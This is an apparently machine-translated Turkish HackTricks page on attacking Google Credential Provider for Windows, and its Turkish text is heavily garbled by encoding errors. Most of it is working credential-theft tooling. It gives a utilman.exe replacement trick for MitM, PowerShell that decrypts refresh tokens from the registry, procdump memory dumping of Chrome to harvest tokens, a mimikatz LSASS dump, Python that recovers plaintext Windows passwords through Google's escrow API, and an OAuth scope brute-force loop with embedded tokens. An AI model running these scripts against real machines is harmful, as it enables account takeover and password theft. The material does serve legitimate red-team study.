# GWS - Workspace Senkronizasyon SaldÄ±rÄ±larÄ± (GCPW, GCDS, AD & EntraID ile Dizin Senkronizasyonu)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± Ekip UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± Ekip UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## GCPW - Windows iÃ§in Google Kimlik SaÄŸlayÄ±cÄ±sÄ±

Bu, kullanÄ±cÄ±larÄ±n **Workspace kimlik bilgilerini** kullanarak Windows PC'lerine giriÅŸ yapabilmeleri iÃ§in Google Workspaces'Ä±n saÄŸladÄ±ÄŸÄ± tek oturum aÃ§ma sistemidir. AyrÄ±ca, bu, PC'deki bazÄ± yerlerde Google Workspace'e eriÅŸim iÃ§in token'larÄ± saklayacaktÄ±r.

{% hint style="success" %}
[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) 'in **GCPW**'yi tespit edebildiÄŸini, yapÄ±landÄ±rma hakkÄ±nda bilgi alabileceÄŸini ve **hatta token'larÄ±** alabileceÄŸini unutmayÄ±n.
{% endhint %}

### GCPW - MitM

Bir kullanÄ±cÄ±, GCPW aracÄ±lÄ±ÄŸÄ±yla Google Workspace ile senkronize edilmiÅŸ bir Windows PC'ye eriÅŸtiÄŸinde, yaygÄ±n bir giriÅŸ formunu doldurmasÄ± gerekecektir. Bu giriÅŸ formu, PC'nin bir istekle yenileme token'Ä± iÃ§in deÄŸiÅŸtireceÄŸi bir OAuth kodu dÃ¶ndÃ¼recektir:

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Yeni satÄ±rlar okunabilirliÄŸi artÄ±rmak iÃ§in eklenmiÅŸtir.

{% hint style="info" %}
Bir MitM gerÃ§ekleÅŸtirmek, PC'ye `Proxifier` yÃ¼kleyerek, `utilman.exe` ikilisini `cmd.exe` ile deÄŸiÅŸtirerek ve Windows giriÅŸ sayfasÄ±nda **eriÅŸilebilirlik Ã¶zelliklerini** Ã§alÄ±ÅŸtÄ±rarak mÃ¼mkÃ¼ndÃ¼r. Bu, **CMD**'yi Ã§alÄ±ÅŸtÄ±racak ve **Proxifier'Ä± baÅŸlatÄ±p yapÄ±landÄ±rmanÄ±zÄ±** saÄŸlayacaktÄ±r.\
`Proxifier`'da HIZLI UDP trafiÄŸini **engellemeyi** unutmayÄ±n, bÃ¶ylece TCP iletiÅŸimine dÃ¼ÅŸer ve gÃ¶rebilirsiniz.

AyrÄ±ca "Hizmetler ve diÄŸer kullanÄ±cÄ±lar" bÃ¶lÃ¼mÃ¼nde her iki seÃ§eneÄŸi de yapÄ±landÄ±rÄ±n ve Windows'a Burp CA sertifikasÄ±nÄ± yÃ¼kleyin.
{% endhint %}

AyrÄ±ca **`HKLM:\SOFTWARE\Google\GCPW`** anahtarÄ±na `enable_verbose_logging = 1` ve `log_file_path = C:\Public\gcpw.log` anahtarlarÄ±nÄ± ekleyerek bazÄ± gÃ¼nlÃ¼klerin saklanmasÄ± saÄŸlanabilir.

### GCPW - Parmak Ä°zi

GCPW'nin bir cihazda kurulu olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in aÅŸaÄŸÄ±daki iÅŸlemin var olup olmadÄ±ÄŸÄ±nÄ± veya aÅŸaÄŸÄ±daki kayÄ±t defteri anahtarlarÄ±nÄ±n var olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek mÃ¼mkÃ¼ndÃ¼r:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
In **`HKCU:\SOFTWARE\Google\Accounts`** kullanÄ±cÄ± e-posta adresine ve kullanÄ±cÄ±nÄ±n yakÄ±n zamanda giriÅŸ yapmasÄ± durumunda ÅŸifrelenmiÅŸ **refresh token**'a eriÅŸmek mÃ¼mkÃ¼ndÃ¼r.

In **`HKLM:\SOFTWARE\Google\GCPW\Users`** `domains_allowed` anahtarÄ±nda giriÅŸ yapmasÄ±na izin verilen **domainler** bulunabilir ve alt anahtarlarda kullanÄ±cÄ±ya ait e-posta, resim, kullanÄ±cÄ± adÄ±, token Ã¶mrÃ¼, token tutamaÄŸÄ± gibi bilgilere ulaÅŸmak mÃ¼mkÃ¼ndÃ¼r.

{% hint style="info" %}
Token tutamaÄŸÄ±, `eth.` ile baÅŸlayan ve bir istek ile bazÄ± bilgilerin Ã§Ä±karÄ±labileceÄŸi bir token'dÄ±r:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

AyrÄ±ca, bir eriÅŸim jetonunun token handle'Ä±nÄ± ÅŸu ÅŸekilde bir istekle bulmak mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

BildiÄŸim kadarÄ±yla, token handle'dan bir refresh token veya access token almak mÃ¼mkÃ¼n deÄŸil.
{% endhint %}

AyrÄ±ca, dosya **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** farklÄ± **ayarlar** hakkÄ±nda bilgileri iÃ§eren bir json'dur; Ã¶rneÄŸin `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (eÄŸer Workspace'ten birkaÃ§ kullanÄ±cÄ± bilgisayara giriÅŸ yapabiliyorsa) ve `validityPeriodDays` (bir kullanÄ±cÄ±nÄ±n Google ile doÄŸrudan yeniden kimlik doÄŸrulamasÄ± yapmasÄ±na gerek olmadÄ±ÄŸÄ± gÃ¼n sayÄ±sÄ±).

### GCPW - KayÄ±t Defteri Yenileme Token'larÄ±

KayÄ±t defteri **`HKCU:\SOFTWARE\Google\Accounts`** iÃ§inde, iÃ§inde **`refresh_token`** ÅŸifrelenmiÅŸ bazÄ± hesaplar bulmak mÃ¼mkÃ¼n olabilir. **`ProtectedData.Unprotect`** yÃ¶ntemi bunu kolayca Ã§Ã¶zebilir.

<details>

<summary><strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> verilerini al ve refresh_tokens'Ä± Ã§Ã¶z</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Ã–rnek Ã§Ä±kÄ±ÅŸ:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

[**Bu videoda**](https://www.youtube.com/watch?v=FEQxHRRP\_5I) aÃ§Ä±klandÄ±ÄŸÄ± gibi, eÄŸer kayÄ±t defterinde token bulamazsanÄ±z, **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** deÄŸerini deÄŸiÅŸtirmek (veya silmek) mÃ¼mkÃ¼ndÃ¼r ve kullanÄ±cÄ± bilgisayara eriÅŸtiÄŸinde tekrar giriÅŸ yapmasÄ± gerekecek ve **token Ã¶nceki kayÄ±t defterinde saklanacaktÄ±r**.

### GCPW - Disk Yenileme Tokenleri

Dosya **`%LocalAppData%\Google\Chrome\User Data\Local State`** kullanÄ±cÄ±nÄ±n **Google Chrome profillerinde** bulunan **`refresh_tokens`** ÅŸifresini Ã§Ã¶zmek iÃ§in anahtarÄ± saklar:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

Bu tokenlere ÅŸifrelenmemiÅŸ ÅŸekilde eriÅŸen bazÄ± **C# kodlarÄ±nÄ±** [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) iÃ§inde bulmak mÃ¼mkÃ¼ndÃ¼r.

AyrÄ±ca, ÅŸifreleme bu kodda bulunabilir: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

AESGCM'nin kullanÄ±ldÄ±ÄŸÄ± gÃ¶zlemlenebilir, ÅŸifrelenmiÅŸ token bir **sÃ¼rÃ¼m** ile baÅŸlar (**`v10`** ÅŸu anda), ardÄ±ndan [**12B nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42) gelir ve ardÄ±ndan **ÅŸifreli metin** ile son bir **16B mac** bulunur.

### GCPW - SÃ¼reÃ§ BelleÄŸinden Token DÃ¶kÃ¼mÃ¼

AÅŸaÄŸÄ±daki script, `procdump` kullanarak her **Chrome** sÃ¼recini **dÃ¶kme** iÃ§in kullanÄ±labilir, **stringleri** Ã§Ä±kartÄ±r ve ardÄ±ndan **eriÅŸim ve yenileme tokenleri** ile ilgili stringleri **arama** yapar. EÄŸer Chrome bir Google sitesine baÄŸlÄ±ysa, bazÄ± **sÃ¼reÃ§ler bellek iÃ§inde yenileme ve/veya eriÅŸim tokenlerini saklÄ±yor olacaktÄ±r!**

<details>

<summary>Chrome sÃ¼reÃ§lerini dÃ¶k ve tokenleri ara</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

`gcpw_extension.exe` ile aynÄ± ÅŸeyi denedim ama herhangi bir token bulamadÄ±.

Bir sebepten dolayÄ±, **bazÄ± Ã§Ä±karÄ±lan eriÅŸim token'larÄ± geÃ§erli olmayacak (bazÄ±larÄ± geÃ§erli olsa da)**. Dump'tan geÃ§erli token'Ä± elde etmek iÃ§in karakterleri 1'er 1'er kaldÄ±rmak amacÄ±yla aÅŸaÄŸÄ±daki scripti denedim. GeÃ§erli bir token bulmama asla yardÄ±mcÄ± olmadÄ±, ama belki yardÄ±mcÄ± olabilir diye dÃ¼ÅŸÃ¼nÃ¼yorum:

<details>

<summary>Karakterleri 1'er 1'er kaldÄ±rarak eriÅŸim token'Ä±nÄ± kontrol et</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - DÃ¼z metin ÅŸifresini geri kazanma

GCPW'yi kullanarak ÅŸifrenin dÃ¼z metnini geri kazanmak iÃ§in **mimikatz** kullanarak **LSASS**'dan ÅŸifrelenmiÅŸ ÅŸifreyi dÃ¶kmek mÃ¼mkÃ¼ndÃ¼r:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Sonra, resmi gibi `Chrome-GCPW-<sid>` ÅŸeklinde gizli anahtarÄ± arayÄ±n:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Daha sonra, `https://www.google.com/accounts/OAuthLogin` kapsamÄ±na sahip bir **eriÅŸim belirteci** ile ÅŸifreyi ÅŸifrelemek iÃ§in Ã¶zel anahtarÄ± talep etmek mÃ¼mkÃ¼ndÃ¼r:

<details>

<summary>EriÅŸim belirteci, ÅŸifreli ÅŸifre ve kaynak kimliÄŸi verildiÄŸinde ÅŸifreyi dÃ¼z metin olarak elde etmek iÃ§in script</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

Bunun ana bileÅŸenlerini Chromium kaynak kodunda bulmak mÃ¼mkÃ¼ndÃ¼r:

* API alanÄ±: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* API uÃ§ noktasÄ±: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Yenileme jetonlarÄ±ndan eriÅŸim jetonlarÄ± oluÅŸturma

Yenileme jetonunu kullanarak, aÅŸaÄŸÄ±daki komutta belirtilen istemci kimliÄŸi ve istemci sÄ±rrÄ± ile eriÅŸim jetonlarÄ± oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Kapsamlar

{% hint style="info" %}
Bir refresh token'a sahip olsanÄ±z bile, eriÅŸim token'Ä± iÃ§in herhangi bir kapsam talep etmek mÃ¼mkÃ¼n deÄŸildir Ã§Ã¼nkÃ¼ yalnÄ±zca **eriÅŸim token'Ä±nÄ± oluÅŸturduÄŸunuz uygulama tarafÄ±ndan desteklenen kapsamlarÄ± talep edebilirsiniz**.

AyrÄ±ca, refresh token her uygulamada geÃ§erli deÄŸildir.
{% endhint %}

VarsayÄ±lan olarak GCPW, kullanÄ±cÄ± olarak her olasÄ± OAuth kapsamÄ±na eriÅŸime sahip olmayacaktÄ±r, bu nedenle aÅŸaÄŸÄ±daki script'i kullanarak `refresh_token` ile bir `access_token` oluÅŸturmak iÃ§in kullanÄ±labilecek kapsamlarÄ± bulabiliriz:

<details>

<summary>KapsamlarÄ± brute-force etmek iÃ§in Bash script'i</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anÄ±nda aldÄ±ÄŸÄ±m Ã§Ä±ktÄ± ÅŸuydu:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
AyrÄ±ca, Chromium kaynak kodunu kontrol ederek [**bu dosyayÄ± bulmak mÃ¼mkÃ¼ndÃ¼r**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), bu dosya **daha Ã¶nce zorla elde edilen listede** **gÃ¶rÃ¼nmeyen diÄŸer kapsamlarÄ±** iÃ§ermektedir. Bu nedenle, bu ek kapsamlarÄ±n varsayÄ±lmasÄ± mÃ¼mkÃ¼ndÃ¼r:

<details>

<summary>Ek kapsamlar</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

